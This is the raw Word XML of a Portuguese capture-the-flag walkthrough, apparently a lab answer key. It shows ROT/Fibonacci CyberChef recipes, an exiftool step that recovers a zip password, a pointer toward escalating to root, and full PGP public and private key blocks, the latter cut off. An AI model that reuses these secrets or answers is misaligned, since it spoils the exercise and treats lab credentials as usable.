      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">  {"op":"ROT13","args":[true,true,false,8]},</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">  {"op":"ROT13","args":[true,true,false,5]},</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">  {"op":"ROT13","args":[true,true,false,3]},</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">  {"op":"ROT13","args":[true,true,false,2]},</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">  {"op":"ROT13","args":[true,true,false,1]},</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">  {"op":"ROT13","args":[true,true,false,1]}</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:br/>
        <w:t>]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DD87A06" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Answer</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54CE2161" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:r>
        <w:t>6.2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02E360FB" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="17"/>
        </w:numPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:spacing w:after="160" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Após descobrires as credenciais para desbloquear a pasta pessoal do Rodrigo encontraste um ficheiro com uma pequena nota.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="680C2F62" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="17"/>
        </w:numPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:spacing w:after="160" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">A nota fala da rotação dourada, também conhecida como proporção áurea. Segue a imagem da sequencia de Fibonnaci (usa </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode3"/>
          <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        </w:rPr>
        <w:t>get fibonnaci.png</w:t>
      </w:r>
      <w:r>
        <w:t>) encontrada na mesma pasta e aplica-a do maior para o menor com rot na pequena string que tem na nota. (ROT(fibonacci))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3682B745" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="17"/>
        </w:numPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:spacing w:after="160" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Receita cyberchef:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FBD956D" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="FencedCode"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>[</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">  {"op":"ROT13","args":[true,true,false,-987]},</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">  {"op":"ROT13","args":[true,true,false,-610]},</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">  {"op":"ROT13","args":[true,true,false,-377]},</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">  {"op":"ROT13","args":[true,true,false,-233]},</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">  {"op":"ROT13","args":[true,true,false,-144]},</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">  {"op":"ROT13","args":[true,true,false,-89]},</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">  {"op":"ROT13","args":[true,true,false,-55]},</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">  {"op":"ROT13","args":[true,true,false,-34]},</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">  {"op":"ROT13","args":[true,true,false,-21]},</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">  {"op":"ROT13","args":[true,true,false,-13]},</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">  {"op":"ROT13","args":[true,true,false,-8]},</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">  {"op":"ROT13","args":[true,true,false,-5]},</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">  {"op":"ROT13","args":[true,true,false,-3]},</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">  {"op":"ROT13","args":[true,true,false,-2]},</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">  {"op":"ROT13","args":[true,true,false,-1]},</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">  {"op":"ROT13","args":[true,true,false,-1]}</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:br/>
        <w:t>]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="371A5BC0" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="17"/>
        </w:numPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:spacing w:after="160" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Esta string da nota é uma password para uma pasta com uma imagem para o utilizador usar novamente </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode3"/>
          <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        </w:rPr>
        <w:t>get BALATRO.png</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="093EB6D6" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="17"/>
        </w:numPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:spacing w:after="160" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>O utilizador deve verificar os metadados desta imagem para recuperar uma password para descompactar o ficheiro nomedia.zip.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45F8DA4D" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="17"/>
        </w:numPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:spacing w:after="160" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode3"/>
          <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        </w:rPr>
        <w:t>exiftool BALATRO.PNG</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> &gt; </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode3"/>
          <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        </w:rPr>
        <w:t>cGFsbWVpcmFzbnVuY2F0ZXJhbXVuZGlhbA== - palmeirasnuncateramundial</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76DB9C67" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="17"/>
        </w:numPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:spacing w:after="160" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>O ficheiro possui um script que contem a única forma de estabelecer e recriar caminhos na máquina. Executa e lê o script e segue o caminho que ele fez. Aí estará as verdadeiras instruções para subires a root. &lt;/details&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="620C12DA" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:pageBreakBefore/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="043C23B8" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000" w:rsidP="00392CCA">
      <w:pPr>
        <w:pStyle w:val="Ttulo2"/>
      </w:pPr>
      <w:bookmarkStart w:id="132" w:name="_Toc213874733"/>
      <w:bookmarkStart w:id="133" w:name="_Toc213881931"/>
      <w:r>
        <w:t>Passo 6.3:</w:t>
      </w:r>
      <w:bookmarkEnd w:id="132"/>
      <w:bookmarkEnd w:id="133"/>
    </w:p>
    <w:p w14:paraId="1232FA40" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Riddle</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48B729C3" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Publica à vista, privada só se pode usar,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35CA06BE" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:r>
        <w:t>PGP guarda o segredo que só quem sabe vai decifrar.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="227165E4" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Hint</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="735E9E83" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Analisa o script para encontrares os caminhos das keys.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FF3FAC2" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Answer</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DE79EFF" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:r>
        <w:t>6.3</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59CB7128" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="17"/>
        </w:numPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:spacing w:after="160" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Caminho da public key: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode3"/>
          <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        </w:rPr>
        <w:t>/usr/local/bin/public.key</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CC0E12C" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="17"/>
        </w:numPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:spacing w:after="160" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Public key:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E8B466D" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="FencedCode"/>
      </w:pPr>
      <w:r>
        <w:t>-----BEGIN PGP PUBLIC KEY BLOCK-----</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>Version: Keybase OpenPGP v2.1.15</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>Comment: https://keybase.io/crypto</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>xo0EaQptLQEEAPSCOUdiQXMLCwY/VaMyLoSJSBpj3zqZ6AGJRq5sKRLlv7KKEHSv</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>sY+uTMD4x0RiFdlutNlUlRcLiah3bg/Mee6M15xvx81eq9hrHv8rfhBzsHCqSg9A</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>wUo5KcVu8j8D3Yt3FTmrf4u8uDqDXIXT2qqWENktaKuBCykcs9MkoW2NABEBAAHN</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>AMK0BBMBCgAeBQJpCm0tAhsvAwsJBwMVCggCHgECF4ADFgIBAhkBAAoJEKAkM72S</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>jGtnc1kEAK57Z6uewQCEnvskvDA2DPesPkTi9EQI2OGoR4fZQl5swBmK618JDtjr</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>8gd/ERr2Y2NaGGmkPoF29pXwqiHWnEWYTzKQySalPgD5xMkB1R7sIxUQ+rv1ZTQh</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>BC65+rx+97ZvI3rCXJQkdA8oluIXNmBXYKs6U13aJoUJRijP7+VAzo0EaQptLQEE</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>AMF68cfBvgeglDhs0SX2iQ3TqJi7UnnRYl9F7cID1UI/+M8swYrwE+n+FSXpogVs</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>miqjUkmGXu2DgmTiRvLoX5ZipNhGcgGUihK6mzsYkwSWWOPUgvHPDP790k4qNSoH</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>JKrY0bMNZcI9FGuGbwV5FzEhNpQkBhEK2iLW6+NHx4BbABEBAAHCwIMEGAEKAA8F</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>AmkKbS0FCQ8JnAACGy4AqAkQoCQzvZKMa2edIAQZAQoABgUCaQptLQAKCRAgJbLM</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>osR7rCtBA/9VPUhcBxW4oUsJu5Pm64xUg8NNy0FyYbWUX9xV5bjJkz2HNUwseRnL</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>N4QjAIHA1IM86UqH5nJMUQxNu/Nug6Jb4tbLv83gptmmqiCpRGHOhmTE1kfGsUgU</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>xpBzfm2sHmq8jk4Zvhdgd5s33GqSYJhgxi027TRZl8KmIai7FZMAJHfUA/44R7KH</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>9pvAeE26bW4MR+CU0eXkO66dWoVukh1ZgbQpX1NoSum7SV9aqJC8aiqwc3YWgQKl</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>EsabMFfD73G4fbtlpe77wSTx78L3F88nNmZ5JWqUjfzh7fMT6siiKrm0y43PWB3u</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>PAyNTT9l0Yd48jNWIUXnPShc8WCTvelIrJAQ9c6NBGkKbS0BBADa+I3l+elZfN3M</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>nvztw9GCdDn7/ZahXBFE1a0Je7Ih1NGAQv0RA/6LWxnae/O+HAyZxgbwM4fY+pIF</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>saRpCF+UB635c5bJMteGcyvGLkcZI8ITpo0Z6vKund3ry+Mp7MMUsrJZZDYX1aKK</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>TA/GB6eLPENYU66dgvHxglm1v/XpBQARAQABwsCDBBgBCgAPBQJpCm0tBQkDwmcA</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>AhsuAKgJEKAkM72SjGtnnSAEGQEKAAYFAmkKbS0ACgkQK/JwGqH6Pl4IMAQAi8Cp</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>JpLZxJ2ThAzhKNQ86EYx1d1aRBVZpg45NiUYFz+uVn6heKfEm5i6C5v8pr8H7fqT</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>zbRNt5fjyF2zdGv9Jye0vweGXLpII+eaV94JzJvqUL3+uR66q4vdMTOoS9u3GtXz</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>zgYcN3PLyJsxIhC35fz2USrq01oZEBYTj0GXOqP0fQP/cAPfNHf/+fAVKaCEE/02</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>Mpy5MQf6DYPNHCqm4VRQukAFlvC2SxLd31VzUYJP46m3ewrvFE2C7T1AZ4ZYKmeJ</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>iTg+rrtEle/9b+r2oCAIgIoPceWjm2nNVLLS3UZw6V9K+6WGPCk8KWclkYxMZvju</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>+SQE/gdOAygfSD9b6FBSNbw=</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>=r0p+</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>-----END PGP PUBLIC KEY BLOCK-----</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00199DBE" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="17"/>
        </w:numPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:spacing w:after="160" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Caminho da private key: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode3"/>
          <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>/boot/EFI/BOOT/priv.key</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71C522D7" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="17"/>
        </w:numPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:spacing w:after="160" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Private key:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32D68160" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="FencedCode"/>
      </w:pPr>
      <w:r>
        <w:t>-----BEGIN PGP PRIVATE KEY BLOCK-----</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>Version: Keybase OpenPGP v2.1.15</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>Comment: https://keybase.io/crypto</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>xcEXBGkKbS0BBAD0gjlHYkFzCwsGP1WjMi6EiUgaY986megBiUaubCkS5b+yihB0</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>r7GPrkzA+MdEYhXZbrTZVJUXC4mod24PzHnujNecb8fNXqvYax7/K34Qc7BwqkoP</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>QMFKOSnFbvI/A92LdxU5q3+LvLg6g1yF09qqlhDZLWirgQspHLPTJKFtjQARAQAB</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>AAP4joL16YzCtpTleoiNPxZn/LppvW4gAeWBdu2bBN2ZnO8HUVyACapKJ5cmG46W</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>R5j3j4PejEPPK/z09V6m9CIXn6LIoniWdAREZCk3vi6gy+8+jjeDMebwOVuLbRma</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>mMacoHrScDX53C7V/aT3Cby9TLHDbWTy6br2QnexvHySGQIA/+C9ZRcs1qU6bifz</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>NfMzGU3x5LMWV8Ik1P+FKsD32Te5JZmLOP+5oXoPx9kDVbKJ9QpkdUVvCFvh5Mia</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>23FJiQIA9KAYT6Dz9XwRjqTsuH52XtWpPFE1ojGkLJI5Fuf9oalz7jFrrVetaIqU</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>abLXCglyI3llXtZk2HMdThqUU1n25QIAxIzI8mO18I+jEnwODHxCmDJLOVcDa2yW</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>uiHN4EA75R7YBAudNNpDWFgT0d9YYNlZzAaS8tCL4SdKtgwsaTUT/6WPzQDCtAQT</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>AQoAHgUCaQptLQIbLwMLCQcDFQoIAh4BAheAAxYCAQIZAQAKCRCgJDO9koxrZ3NZ</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>BACue2ernsEAhJ77JLwwNgz3rD5E4vRECNjhqEeH2UJebMAZiutfCQ7Y6/IHfxEa</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>9mNjWhhppD6BdvaV8Koh1pxFmE8ykMkmpT4A+cTJAdUe7CMVEPq79WU0IQQuufq8</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>fve2byN6wlyUJHQPKJbiFzZgV2CrOlNd2iaFCUYoz+/lQMfBGARpCm0tAQQAwXrx</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>x8G+B6CUOGzRJfaJDdOomLtSedFiX0XtwgPVQj/4zyzBivAT6f4VJemiBWyaKqNS</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>SYZe7YOCZOJG8uhflmKk2EZyAZSKErqbOxiTBJZY49SC8c8M/v3STio1KgckqtjR</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>sw1lwj0Ua4ZvBXkXMSE2lCQGEQraItbr40fHgFsAEQEAAQAD/1UkbVGiiKWCnLdX</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>65HxM87J3d+YT2scIVYbx80hMq+8xxkkcOdbTughz9ynO413hUBOLt/8KboLrU4H</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>5YDvkWAwjePne6zp8BZ0b9fOqXRoYIRZH3ejBG7EamF1qCDbhW+qrg9ANiXv8JbQ</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>Fo9vXyww+P1V0aEjMX5PGOIEvsxBAgDjGWnt3mfKOcsDYME87fdgTd28wkdzsvhq</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>CFQRNKa00drDLUweEDFojrm7J05WTmBpBu/qSzsDjzFpIeYXm3/XAgDaGkTBiWgs</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>er37fI0LbMhQD5kAyB1yLnqs2J/XKMpNOcnDbg92fnxA5n7fQgniPxcpnjkUCAkv</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>iJGOiG9BWYMdAf43c5gDYhqzoe8N8/cGk2CA67iGvGOguRDkrVJsDI4dpPM9K89U</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>T03BR31FF5k8+SL9Mv7VbkvlddOFCevo3YaLnZXCwIMEGAEKAA8FAmkKbS0FCQ8J</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>nAACGy4AqAkQoCQzvZKMa2edIAQZAQoABgUCaQptLQAKCRAgJbLMosR7rCtBA/9V</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>PUhcBxW4oUsJu5Pm64xUg8NNy0FyYbWUX9xV5bjJkz2HNUwseRnLN4QjAIHA1IM8</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>6UqH5nJMUQxNu/Nug6Jb4tbLv83gptmmqiCpRGHOhmTE1kfGsUgUxpBzfm2sHmq8</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>jk4Zvhdgd5s33GqSYJhgxi027TRZl8KmIai7FZMAJHfUA/44R7KH9pvAeE26bW4M</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>R+CU0eXkO66dWoVukh1ZgbQpX1NoSum7SV9aqJC8aiqwc3YWgQKlEsabMFfD73G4</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>fbtlpe77wSTx78L3F88nNmZ5JWqUjfzh7fMT6siiKrm0y43PWB3uPAyNTT9l0Yd4</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>8jNWIUXnPShc8WCTvelIrJAQ9cfBGARpCm0tAQQA2viN5fnpWXzdzJ787cPRgnQ5</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>+/2WoVwRRNWtCXuyIdTRgEL9EQP+i1sZ2nvzvhwMmcYG8DOH2PqSBbGkaQhflAet</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>+XOWyTLXhnMrxi5HGSPCE6aNGeryrp3d68vjKezDFLKyWWQ2F9WiikwPxgenizxD</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>WFOunYLx8YJZtb/16QUAEQEAAQAD/iMrHfE0jvWkMCRb2aAfXfAfliuCelWeqZhe</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>YC0AfKbh3ScGO0pnE5QStOeKFmbvbteovjcIc7ZV4it/cTo8UcsyoBmFMB/opyIK</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>FE1lEIg2yZDp6hekWcLQ+Z6E/6j1+YaZ4ryELYK5aAw/D2Br1lk9i18oinoBpxEl</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>7a5zeq55AgD/C9z+oVmI9xUwc9gFfPaCbJSdf0ZgVNb6DmjiBxxwUP0p//E0Mol8</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>wa2td44O/D9bB7Ze748+tooj4veSo5VNAgDbyiiihWwLjNIzP3Yf8DvhT3jJByxP</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>Ppokz/ewfMG3RF9CeRu935M2pUVYLOOgPhFJS4WNBlo8sM69oZTrCWaZAgDbClb1</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>J/LXNA0rsRz7nGYDDfW/YKFowenTnNbGyjTsUyfaocy2FYRi/x7/D3efDiqkAwkc</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>8Krxl9iq42xEACVSnG/CwIMEGAEKAA8FAmkKbS0FCQPCZwACGy4AqAkQoCQzvZKM</w:t>
      </w:r>
      <w:r>
        <w:br/>
